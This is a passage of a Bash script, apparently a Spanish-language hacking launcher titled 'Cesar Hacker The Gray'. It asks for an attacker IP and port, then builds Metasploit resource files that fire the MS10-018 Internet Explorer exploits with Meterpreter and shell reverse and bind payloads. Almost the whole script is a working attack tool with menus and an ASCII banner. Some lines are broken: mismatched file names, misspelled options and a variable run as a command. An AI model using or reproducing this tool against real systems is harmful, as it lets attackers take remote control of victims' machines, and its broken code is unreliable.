echo -e "$Y [1] $C windows/meterpreter/reverse_http"
echo -e "$Y [2] $C windows/meterpreter/reverse_https"
echo -e "$Y [3] $C windows/meterpreter/reverse_tcp"
echo -e "$Y [4] $C windows/shell/reverse_http"
echo -e "$Y [5] $C windows/shell/reverse_https"
echo -e "$Y [6] $C windows/shell/reverse_tcp"
echo
printf "$C [Set]$R Links@Cesarhack$Y"
	while read -p " >> " fake && [ -z $fake ]; do
		printf "\n $R
		[Gray] selecciona un payload
		$W \n"

	done
printf "$C [Set]$R RSVHOST$Y"
        while read -p " >> " LHOST && [ -z $LHOST ]; do
                printf "\n $R
                [Gray] porfavor pon un IP [HOST]
                $W \n"
	done

printf "$C [Set]$R RSPORT$Y"
        while read -p " >> " LPORT && [ -z $LPORT ]; do
                printf "\n $R
                [Gray] porfavor pon un puerto [LPORT]
                $W \n"
        done
fake


}
function hacking {


    clear
    echo -e $C":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
    echo -e $C"::::::::::::::::::::$W "Cesar Hacker The Gray  "$W :: ::::::::::::::::::"
    echo -e $C":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
    echo ""
    echo -e $G		" 			             /)  "
    echo " 			            // "
    echo " 			            (( "
    echo " 			            // "
    echo " 			     .-.   //  .-. "
    echo " 			    /   \- ((=-/  \ "
    echo " 			    \       \     / "
    echo " 			     -( ___ ))__)-  "
    echo " 			     .-'   //  '-. "
    echo " 			    /     ((      \ "
    echo " 			    |       *     | "
    echo " 			    \             / "
    echo " 			     \   |_w_|   / "
    echo " 			     _)  \   /  (_ "
    echo "			jgs (((---'   '---))) "
    echo -e $C":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
    echo -e $W"::::::::::::::::::: $W Cesar Hacker The Gray  ::::::::::: ::::::::::::::::"
    echo -e $C":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
    sleep 3



}
function fake {
hacking
Chao_chao

	if [ $fake -eq '1' ]; then
Luzita
echo
printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
echo
rm -rf $TMP_DIR/Gray/Cesar.rc
touch $TMP_DIR/Gray/Cesar.rc
echo "use exploit/windows/browser/ms10_018_ie_tabular_activex" >> $TMP_DIR/Gray/Cesar.rc
echo "set PAYLOAD windows/meterpreter/reverse_http" >> $TMP_DIR/Gray/Cesar.rc
echo "set SRVHOST $LHOST" >> $TMP_DIR/Gray/Cesar.rc
echo "set SRVPORT $LPORT" >> $TMP_DIR/Gray/Cesar.rc
echo "set URIPATCH mf10_018.html" >> $TMP_DIR/Gray/Cesar.rc
echo "exploit" >> $TMP_DIR/Gray/Cesar.rc
chmod 777 $TMP_DIR/Gray/Cesar.rc
echo "
"
msfconsole -q -r $TMP_DIR/Gray/explotador.rc

	elif [ $fake -eq '2' ]; then

echo
printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
echo
rm -rf $TMP_DIR/Gray/Cesar.rc
touch $TMP_DIR/Gray/Cesar.rc
echo "use exploit/windows/browser/ms10_018_ie_tabular_activex" >> $TMP_DIR/Gray/Cesar.rc
echo "set PAYLOAD windows/meterpreter/reverse_https" >> $TMP_DIR/Gray/Cesar.rc
echo "set SRVHOST $LHOST" >> $TMP_DIR/Gray/Cesar.rc
echo "set SRVPORT $LPORT" >> $TMP_DIR/Gray/Cesar.rc
echo "set URIPATCH mf10_018.html" >> $TMP_DIR/Gray/Cesar.rc
echo "exploit" >> $TMP_DIR/Gray/Cesar.rc
chmod 777 $TMP_DIR/Gray/Cesar.rc
echo "
"
msfconsole -q -r $TMP_DIR/Gray/Cesar.rc

	
	elif [ $fake -eq '3' ]; then

echo
printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
echo
rm -rf $TMP_DIR/Gray/Cesar.rc
touch $TMP_DIR/Gray/Cesar.rc
echo "use exploit/windows/browser/ms10_018_ie_tabular_activex" >> $TMP_DIR/Gray/Cesar.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $TMP_DIR/Gray/Cesar.rc
echo "set SRVHOST $LHOST" >> $TMP_DIR/Gray/Cesar.rc
echo "set SRVPORT $LPORT" >> $TMP_DIR/Gray/Cesar.rc
echo "set URIPATCH mf10_018.html" >> $TMP_DIR/Gray/Cesar.rc
echo "exploit" >> $TMP_DIR/Gray/Cesar.rc
chmod 777 $TMP_DIR/Gray/Cesar.rc
echo "
"
msfconsole -q -r $TMP_DIR/Gray/Cesar.rc
	
	elif [ $fake -eq '4' ]; then

echo
printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
echo
rm -rf $TMP_DIR/Gray/Cesar.rc
touch $TMP_DIR/Gray/Cesar.rc
echo "use exploit/windows/browser/ms10_018_ie_tabular_activex" >> $TMP_DIR/Gray/Cesar.rc
echo "set PAYLOAD windows/shell/reverse_http" >> $TMP_DIR/Gray/Cesar.rc
echo "set SRVHOST $LHOST" >> $TMP_DIR/Gray/Cesar.rc
echo "set SRVPORT $LPORT" >> $TMP_DIR/Gray/Cesar.rc
echo "set URIPATCH mf10_018.html" >> $TMP_DIR/Gray/Cesar.rc
echo "exploit" >> $TMP_DIR/Gray/Cesar.rc
chmod 777 $TMP_DIR/Gray/Cesar.rc
echo "
"
msfconsole -q -r $TMP_DIR/Gray/Cesar.rc

	elif [ $fake -eq '5' ]; then

echo
printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
echo
rm -rf $TMP_DIR/Gray/Cesar.rc
touch $TMP_DIR/Gray/Cesar.rc
echo "use exploit/windows/browser/ms10_018_ie_tabular_activex" >> $TMP_DIR/Gray/Cesar.rc
echo "set PAYLOAD windows/shell/reverse_https" >> $TMP_DIR/Gray/Cesar.rc
echo "set SRVHOST $LHOST" >> $TMP_DIR/Gray/Cesar.rc
echo "set SRVPORT $LPORT" >> $TMP_DIR/Gray/Cesar.rc
echo "set URIPATCH mf10_018.html" >> $TMP_DIR/Gray/Cesar.rc
echo "exploit" >> $TMP_DIR/Gray/Cesar.rc
chmod 777 $TMP_DIR/Gray/Cesar.rc
echo "
"
msfconsole -q -r $TMP_DIR/Gray/Cesar.rc

	elif [ $fake -eq '6' ]; then

echo
printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
echo
rm -rf $TMP_DIR/Gray/Cesar.rc
touch $TMP_DIR/Gray/Cesar.rc
echo "use exploit/windows/browser/ms10_018_ie_tabular_activex" >> $TMP_DIR/Gray/Cesar.rc
echo "set PAYLOAD windows/shell/reverse_tcp" >> $TMP_DIR/Gray/Cesar.rc
echo "set SRVHOST $LHOST" >> $TMP_DIR/Gray/Cesar.rc
echo "set SRVPORT $LPORT" >> $TMP_DIR/Gray/Cesar.rc
echo "set URIPATCH mf10_018.html" >> $TMP_DIR/Gray/Cesar.rc
echo "exploit" >> $TMP_DIR/Gray/Cesar.rc
chmod 777 $TMP_DIR/Gray/Cesar.rc
echo "
"
msfconsole -q -r $TMP_DIR/Gray/Cesar.rc


fi

}
function explotador {
hacking
Chao_chao
	if [ $link -eq '1' ]; then
echo
printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
echo
rm -rf $TMP_DIR/Gray/explotador.rc
touch $TMP_DIR/Gray/explotador.rc
echo "use exploit/windows/browser/ms10_018_ie_behaviors" >> $TMP_DIR/Gray/explotador.rc
echo "set PAYLOAD windows/meterpreter/bind_http" >> $TMP_DIR/Gray/explotador.rc
echo "set RSVHOST $LHOST" >> $TMP_DIR/Gray/explotador.rc
echo "set LPORT $LPORT" >> $TMP_DIR/Gray/explotador.rc
echo "set URIPATCH mf10_018.html" >> $TMP_DIR/Gray/explotador.rc
echo "exploit" >> $TMP_DIR/Gray/explotador.rc
chmod 777 $TMP_DIR/Gray/explotador.rc
echo "
"
msfconsole -q -r $TMP_DIR/Gray/explotador.rc

	elif [ $link -eq '2' ]; then

echo
printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
echo
rm -rf $TMP_DIR/Gray/explotador.rc
touch $TMP_DIR/Gray/explotador.rc
echo "use exploit/windows/browser/ms10_018_ie_behaviors" >> $TMP_DIR/Gray/explotador.rc
echo "set PAYLOAD windows/meterpreter/bind_https" >> $TMP_DIR/Gray/explotador.rc
echo "set RSVHOST $LHOST" >> $TMP_DIR/Gray/explotador.rc
echo "set LPORT $LPORT" >> $TMP_DIR/Gray/explotador.rc
echo "set URIPATCH mf10_018.html" >> $TMP_DIR/Gray/explotador.rc
echo "exploit" >> $TMP_DIR/Gray/explotador.rc
chmod 777 $TMP_DIR/Gray/explotador.rc
echo "
"
msfconsole -q -r $TMP_DIR/Gray/explotador.rc

	
	elif [ $link -eq '3' ]; then

echo
printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
echo
rm -rf $TMP_DIR/Gray/explotador.rc
touch $TMP_DIR/Gray/explotador.rc
echo "use exploit/windows/browser/ms10_018_ie_behaviors" >> $TMP_DIR/Gray/explotador.rc
echo "set PAYLOAD windows/meterpreter/bind_tcp" >> $TMP_DIR/Gray/explotador.rc
echo "set RSVHOST $LHOST" >> $TMP_DIR/Gray/explotador.rc
echo "set LPORT $LPORT" >> $TMP_DIR/Gray/explotador.rc
echo "set URIPATCH mf10_018.html" >> $TMP_DIR/Gray/explotador.rc
echo "exploit" >> $TMP_DIR/Gray/explotador.rc
chmod 777 $TMP_DIR/Gray/explotador.rc
echo "
"
msfconsole -q -r $TMP_DIR/Gray/explotador.rc
	
	elif [ $link -eq '4' ]; then

echo
printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
echo
rm -rf $TMP_DIR/Gray/explotador.rc
touch $TMP_DIR/Gray/explotador.rc
echo "use exploit/windows/browser/ms10_018_ie_behaviors" >> $TMP_DIR/Gray/explotador.rc
echo "set PAYLOAD windows/shell/bind_http" >> $TMP_DIR/Gray/explotador.rc
echo "set RSVHOST $LHOST" >> $TMP_DIR/Gray/explotador.rc
echo "set LPORT $LPORT" >> $TMP_DIR/Gray/explotador.rc
echo "set URIPATCH mf10_018.html" >> $TMP_DIR/Gray/explotador.rc
echo "exploit" >> $TMP_DIR/Gray/explotador.rc
chmod 777 $TMP_DIR/Gray/explotador.rc
echo "
"
msfconsole -q -r $TMP_DIR/Gray/explotador.rc

	elif [ $link -eq '5' ]; then

echo
printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
echo
rm -rf $TMP_DIR/Gray/explotador.rc
touch $TMP_DIR/Gray/explotador.rc
echo "use exploit/windows/browser/ms10_018_ie_behaviors" >> $TMP_DIR/Gray/explotador.rc
echo "set PAYLOAD windows/shell/bind_https" >> $TMP_DIR/Gray/explotador.rc
echo "set RSVHOST $LHOST" >> $TMP_DIR/Gray/explotador.rc
echo "set LPORT $LPORT" >> $TMP_DIR/Gray/explotador.rc
echo "set URIPATCH mf10_018.html" >> $TMP_DIR/Gray/explotador.rc
echo "exploit" >> $TMP_DIR/Gray/explotador.rc
chmod 777 $TMP_DIR/Gray/explotador.rc
echo "
"
msfconsole -q -r $TMP_DIR/Gray/explotador.rc

	elif [ $link -eq '6' ]; then

echo
printf "$C [Gray]$R explotando.... $Y msfconsole . . .$W"
echo
rm -rf $TMP_DIR/Gray/explotador.rc
touch $TMP_DIR/Gray/explotador.rc
echo "use exploit/windows/browser/ms10_018_ie_behaviors" >> $TMP_DIR/Gray/explotador.rc
echo "set PAYLOAD windows/shell/bind_tcp" >> $TMP_DIR/Gray/explotador.rc
echo "set RSVHOST $LHOST" >> $TMP_DIR/Gray/explotador.rc
echo "set LPORT $LPORT" >> $TMP_DIR/Gray/explotador.rc
echo "set URIPATCH mf10_018.html" >> $TMP_DIR/Gray/explotador.rc
echo "exploit" >> $TMP_DIR/Gray/explotador.rc
chmod 777 $TMP_DIR/Gray/explotador.rc
echo "
"
msfconsole -q -r $TMP_DIR/Gray/explotador.rc

fi
}
echo
echo
banner4
echo
echo
sleep 3
menu
